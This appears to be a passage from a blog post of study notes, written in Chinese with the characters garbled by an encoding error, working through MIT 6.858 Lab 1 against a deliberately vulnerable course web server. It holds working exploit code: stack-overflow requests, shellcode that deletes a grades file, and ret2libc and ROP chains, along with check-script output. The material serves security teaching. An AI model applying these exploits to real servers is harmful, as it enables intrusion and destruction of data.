21.10</a>çš„vmdkï¼Œå®‰è£…å®Œä¹‹åæ˜¯ä¸€ä¸ªttyï¼Œå‘ç°æ²¡æœ‰net-toolsï¼Œä¹Ÿä¸èƒ½ä»è™šæ‹Ÿæœºå¤–å¤åˆ¶è¿›æ¥å†…å®¹ï¼Œå»å­¦ä¹ äº†ä¸€ä¸‹å‘ç°<code>ip addr</code>ä¹Ÿå¯ä»¥æŸ¥çœ‹ipï¼Œä¸è¿‡è¿™ä¸ªè¾“å‡ºæœ‰ç‚¹å¤šï¼Œè¿™ä¸ªè™šæ‹Ÿæœºç»ˆç«¯ä¹Ÿæ²¡æ³•å¾€ä¸Šæ»šåŠ¨ï¼ŒåŠ äº†ä¸€ä¸ªgrep 192.168å°±å¥½äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~$ ip addr | grep 192.168<br>    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥sshäº†</p><p>ä½†æ˜¯ubuntu21.10å·²ç»æ²¡æ³•apt installäº†ï¼ˆ</p><p>å®éªŒçš„å†…å®¹åœ¨<code>git clone https://web.mit.edu/6858/2022/lab.git </code></p><h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>æŒ‰ç…§è¯´æ˜ï¼Œé¦–å…ˆmakeä¸€ä¸‹ï¼Œç„¶åè¿è¡Œ<code>./clean-env.sh ./zookd 8080</code></p><blockquote><p>è¿™é‡Œæœ‰ä¸ªå¾ˆç„å­¦çš„é—®é¢˜æ˜¯ï¼Œæˆ‘åœ¨ç‰©ç†æœºä¸Šcloneä¸‹æ¥labï¼Œå†ç”¨vscodeä¼ è™šæ‹Ÿæœºï¼Œä¸å…‰ç¨‹åºè¿è¡Œèµ·æ¥è®¿é—®ä¸åˆ°ç½‘é¡µï¼Œmakeçš„æ—¶å€™ä¹Ÿæœ‰è­¦å‘Šã€‚åœ¨è™šæ‹Ÿæœºé‡Œcloneä¸‹æ¥çš„å°±ä»€ä¹ˆé—®é¢˜éƒ½æ²¡æœ‰ğŸ˜¶â€ğŸŒ«ï¸</p></blockquote><p>ç„¶åå¯ä»¥è®¿é—®åˆ°ç½‘é¡µï¼Œæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢</p><h4 id="lab1-exercise-1-2"><a href="#lab1-exercise-1-2" class="headerlink" title="lab1 exercise 1 + 2"></a>lab1 exercise 1 + 2</h4><p>exercise1 è®©åœ¨<code>zookd.c</code>å’Œ<code>http.c</code>æ‰¾æ¼æ´</p><p>mainå‡½æ•°åœ¨zookd.cä¸­ä¸‹é¢è§£é‡Šå„ä¸ªå‡½æ•°å¹²äº†ä»€ä¹ˆ</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">main : ä¼ å…¥å‚æ•°port è°ƒç”¨run<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>run_server : é€šè¿‡start<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span>åˆå§‹åŒ–socketï¼Œ<br>             ç„¶åä¸€ä¸ªæ­»å¾ªç¯ï¼Œå¯¹æ¯ä¸ªaccept forkå‡ºä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œprocess<span class="hljs-constructor">_client(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>process_client : <br>    <span class="hljs-number">1.</span> http_request_line (http.c) : å¤„ç†è¯·æ±‚åŒ…çš„ç¬¬ä¸€è¡Œï¼Œå³<span class="hljs-string">&quot;GET /foo.html HTTP/1.0&quot;</span>è¿™ç§<br>    <span class="hljs-number">2.</span> http_request_headers (http.c) : ä¸€ä¸ªæ­»å¾ªç¯å¤„ç†ä»ç¬¬äºŒè¡Œå¼€å§‹çš„æ‰€æœ‰å†…å®¹ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚<br>       acceptæ¥çš„buf<span class="hljs-literal">[<span class="hljs-number">8192</span>]</span>è¿›è¡Œäº†é˜²æº¢å‡ºå¤„ç†ï¼Œä½†æ˜¯valueå’Œenvvaré•¿åº¦åªæœ‰<span class="hljs-number">512</span>ï¼Œå¯ä»¥æº¢å‡º<br>       æ¯ä¸€å¯¹envvarå’Œvalueå½¢æˆäº†é”®å€¼å¯¹ï¼Œå­˜å‚¨åˆ°äº†ç¯å¢ƒå˜é‡é‡Œ<br>    <span class="hljs-number">3.</span> http_serve (http.c) : åé¢å†è¯´<br></code></pre></td></tr></table></figure><p>exercise2 åªè¯´è¦è®©ç¨‹åºå´©æºƒå°±è¡Œï¼Œä¸ç”¨åŠ«æŒæ§åˆ¶æµï¼Œé‚£ç›´æ¥å‘é€ä¸€ä¸ªå¤§çš„åŒ…è¿‡å»å°±å®Œäº†ã€‚è¦æ±‚å†™ä¸€ä¸ª<code>exploit-2.py</code>çš„è„šæœ¬ï¼Œåœ¨labæ–‡ä»¶å¤¹é‡Œæœ‰ç»™å¥½çš„æ¨¡æ¿<code>exploit-template.py</code>ï¼Œæ”¹ä¸€ä¸‹<code>build_exploit</code>å°±å¥½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \<br>            <span class="hljs-string">b&quot;hack: &quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">8100</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿç¨‹åºæŠ¥é”™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ ./clean-env.sh ./zookd 8080<br><span class="hljs-built_in">exec</span> <span class="hljs-built_in">env</span> - PWD=/home/student/lab SHLVL=0 setarch x86_64 -R ./zookd 8080<br>Child process 9738 terminated incorrectly, receiving signal 11<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-crash<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-crash.sh zookd-exstack ./exploit-2.py<br>10453 --- SIGSEGV &#123;si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffffffff000&#125; ---<br>10453 +++ killed by SIGSEGV (core dumped) +++<br>10416 --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=10453, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=52&#125; ---<br>PASS ./exploit-2.py<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise-3"><a href="#lab1-exercise-3" class="headerlink" title="lab1 exercise 3"></a>lab1 exercise 3</h4><p>labé‡Œç»™äº†ä¸€ä¸ªshellcode.Sï¼Œåœ¨makeæ—¶ä¼šç¼–è¯‘æˆshellcode.binï¼Œå¯ä»¥ç”¨<code>./run-shellcode shellcode.bin</code>æ¥æ‰§è¡Œè¿™ä¸ªç¨‹åºã€‚</p><p>åŸæœ¬æ˜¯execve(â€œ/bin/shâ€)ï¼Œexercise3 è¦æ±‚æŠŠå®ƒæ”¹æˆåˆ é™¤<code>grades.txt</code>ã€‚ç»™çš„shellcode.Sæ˜¯AT&amp;Tæ±‡ç¼–ï¼ŒæŠ„çš„å¤§ä½¬çš„ä»£ç ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br>main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>movq  %rsp, %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */      ä¸åŠ exitä¼šæŠ¥ä¸ªsegmentation faultï¼Œä½†æ˜¯ä¹Ÿèƒ½æ‰§è¡Œ<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise-4"><a href="#lab1-exercise-4" class="headerlink" title="lab1 exercise 4"></a>lab1 exercise 4</h4><p>exercise2 çš„æ ˆæº¢å‡ºæ³¨å…¥shellcodeï¼Œæ‰§è¡Œçš„ç¨‹åºæ¢äº†ä¸€ä¸‹ï¼Œæ¢æˆæ²¡å¼€NXçš„ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨url_decodeå‡½æ•°é‡Œï¼Œå½“spå­—ç¬¦ä¸²é‡Œçœ‹åˆ°äº†\x00å­—ç¬¦ï¼Œå°±ä¼šç»ˆæ­¢å‘valuieé‡Œå¤åˆ¶å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åˆæœ‰æŠŠ%åŠ ä¸¤ä¸ªdigitè½¬æ¢ä¸ºæ•°å­—çš„caseï¼Œå› æ­¤payloadè¦<code>.replace(&quot;\x00,%00&quot;)</code>å†å‘é€ã€‚</p></blockquote><p>æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å­—ç¬¦ä¸²çš„ä½ç½®å’Œè¿”å›åœ°å€çš„ä½ç½®ï¼Œè™½ç„¶<code>value</code>å’Œ<code>envvar</code>çœ‹ä¸Šå»éƒ½å¯ä»¥ï¼Œä½†æ˜¯æ˜¾ç„¶valueæ›´ç®€å•ä¸€ç‚¹ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p>ç¬¬ä¸€ç§ï¼šåæ­£æœ‰æºç ï¼Œç›´æ¥printå‡ºæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value addr : %p\n&quot;</span>, &amp;value);<br><span class="hljs-type">void</span> *stackAddress;<br>__asm__(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (stackAddress));<br>stackAddress = (<span class="hljs-type">void</span>*)((<span class="hljs-type">char</span>*)stackAddress + <span class="hljs-number">8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Return Address Stack Address: %p\n&quot;</span>, stackAddress);<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§ï¼šè°ƒè¯•ï¼Œgdb -p $(pgrep zookd-)<code>ï¼Œä¸‹æ–­ç‚¹</code>b http.c:xxx<code>ï¼ŒæŸ¥çœ‹å˜é‡åœ°å€</code>print &amp;value`ï¼Œæ‹¿åˆ°shellcodeåœ°å€ï¼Œå†ç”¨rbp+8æ‹¿åˆ°è¿”å›åœ°å€ï¼ˆæˆ–è€…info frameï¼‰</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    req += (<br>        shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode)) +  p64(stack_buffer)<br>    ).replace(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <span class="hljs-comment"># æ³¨æ„è¿™é‡Œé¢å¤–çš„ä¸€è¡Œ</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><p>åœ¨<code>http_request_headers</code>çš„æ­»å¾ªç¯è·³å‡ºçš„æ¡ä»¶æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>å› æ­¤æƒ³è¦è·³å‡ºå¾ªç¯ï¼Œå¿…é¡»æœ€åè¦æœ‰ä¸€ä¸ªç©ºè¡Œï¼ï¼ï¼ï¼ï¼ï¼ï¼ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><p>æˆ‘åœ¨è¿™å¡äº†ä¸€ä¸‹åˆï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘çš„æ ˆåœ°å€ä¸å¯¹ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><p>å†å­¦ä¹ ä¸€ä¸‹å¤§ä½¬çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;\r\n&quot;</span><br></code></pre></td></tr></table></figure><p>åªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­4096ä¸ªnopä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œå°±èƒ½æ‰§è¡Œå¤„åé¢çš„shellcodeï¼ˆä½†æ˜¯è¿™ä¸ªåœ°å€åˆæ˜¯å»å“ªçœ‹çš„å‘¢ğŸ˜¶â€ğŸŒ«ï¸</p><p>æ‰§è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ <span class="hljs-built_in">chmod</span> +x ./exploit-4.py <br>student@6858-v22:~/lab$ make check-exstack<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>PASS ./exploit-4.py<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise5"><a href="#lab1-exercise5" class="headerlink" title="lab1 exercise5"></a>lab1 exercise5</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure><p>å¼€äº†nxï¼Œret2libcã€‚è¿™é“é¢˜è¦ä»<code>/proc/&lt;pid&gt;/maps</code>æŸ¥çœ‹libcè¢«åŠ è½½åˆ°å“ªï¼ˆå…¶å®éƒ½å·²ç»gdbäº†ï¼Œç›´æ¥<code>p æŸä¸ªå‡½æ•°</code>ï¼Œå†å‡å»<code>libc.sym[&#39;xxx&#39;]</code>å¾—åˆ°çš„ä¹Ÿä¸€æ ·</p><blockquote><p>åœ¨gdbé‡Œä¹Ÿå¯ä»¥<code>shell cat /proc/&lt;pid&gt;/maps</code></p></blockquote><p>æ ˆåœ°å€å’Œä¹‹å‰æ˜¯ä¸€æ ·çš„ï¼ŒæŠŠå­—ç¬¦ä¸²æ”¾åœ¨valueä¸Šï¼Œç„¶ååœ¨libcé‡Œæ‰¾<code>pop rdi; ret</code>å°±è¡Œäº†ã€‚expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    unlink = libc_base + libc.sym[<span class="hljs-string">&quot;unlink&quot;</span>]<br>    pop_rdi = libc_base + <span class="hljs-number">0x2e6c5</span> <span class="hljs-comment">#  pop rdi ; ret</span><br><br>    payload = <span class="hljs-string">b&quot;/home/student/grades.txt\x00&quot;</span> <br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * (stack_retaddr - stack_buffer - <span class="hljs-built_in">len</span>(payload)) <br>    payload += p64(pop_rdi) + p64(stack_buffer) + p64(unlink)<br><br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += payload + <span class="hljs-string">b&quot;\r\n&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-libc<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>PASS ./exploit-5.py<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„expï¼Œï¼ˆå‡è®¾æœªçŸ¥valueå’Œretaddrï¼‰ï¼Œç”¨mallocåˆ†é…ä¸€æ®µåœ°å€ï¼Œé raxåŠ åç§»é‡å»å†…å®¹çš„æŒ‡ä»¤å®Œæˆå†™å…¥å­—ç¬¦ä¸²ï¼Œç„¶åæŠŠraxæ”¾åˆ°rdié‡Œï¼Œè°ƒç”¨unlinkã€‚</p><p>ä½†æ˜¯åœ¨æˆ‘çš„libcé‡Œï¼Œå‘chunkå†™å…¥å­—ç¬¦ä¸²å€’æ˜¯èƒ½æ‰¾åˆ°gadgetï¼Œä½†æ˜¯æ²¡æ³•æŠŠraxæŒªåˆ°rdié‡Œã€‚æ‰¾ä¸åˆ°ä»¥raxä¸ºsrcï¼Œä»¥ä»»ä½•ä¸€ä¸ªå¯„å­˜å™¨ï¼ˆéå–å†…å®¹ï¼‰ä¸ºdstçš„<code>mov</code>æŒ‡ä»¤ï¼Œä¹Ÿæ‰¾ä¸åˆ°å½¢å¦‚<code>pop_rax_push_xxx_ret</code>çš„ä¸œè¥¿ã€‚å¯„äº†ï¼ˆ</p><p><del>æˆ‘ä¸æå§ä¸ºä»€ä¹ˆåŒä¸€ä¸ªvmdkåˆ›å»ºçš„è™šæ‹Ÿæœºlibcå†…å®¹ä¸ä¸€æ ·ï¼ŸçœŸä¸æ‡‚ğŸ˜­</del></p><p>å¯¹ä¸èµ·ï¼Œçœ‹åˆ°lab2æ‰å‘ç°ä»–æ²¡ç”¨ç»™çš„è™šæ‹Ÿæœº</p><p>è™½ç„¶ä½†æ˜¯ï¼Œè¿˜æ˜¯æ‘†åœ¨è¿™å­¦ä¹ ä¸€ä¸‹å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>   <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise6"><a href="#lab1-exercise6" class="headerlink" title="lab1 exercise6"></a>lab1 exercise6</h4><p>é¢˜ç›®è®©å†æ‰¾ä¸ªæ¼æ´ï¼Œ<del>è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä¼šçš„</del></p><p>http_serveå­˜åœ¨æ–‡ä»¶ç›®å½•ç©¿è¶Šæ¼æ´ã€‚</p><p><img src="/img/mit6858/1.jpg"></p><h4 id="lab1-exercise7"><a href="#lab1-exercise7" class="headerlink" title="lab1 exercise7"></a>lab1 exercise7</h4><p>æŠŠvalueï¼Œenvvarï¼Œreqpathæ•°ç»„å¤§å°å…¨éƒ¨æ”¹æˆ8192å°±å¥½äº†</p><p>make check-fixedä¹‹å‰çš„expå…¨éƒ¨å¤±æ•ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">./check-crash.sh zookd-exstack ./exploit-2.py<br>./check-crash.sh: line 36:  2730 Killed                  <span class="hljs-variable">$2</span> <span class="hljs-variable">$HOST</span> <span class="hljs-variable">$PORT</span> &gt; /dev/null<br>FAIL ./exploit-2.py<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>FAIL ./exploit-4.py<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>FAIL ./exploit-5.py<br><span class="hljs-built_in">rm</span> shellcode.o<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å­¦ä¹ ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡åˆ°çš„å¥‡å¥‡æ€ªæ€ªé—®é¢˜æ±‡æ€»</title>
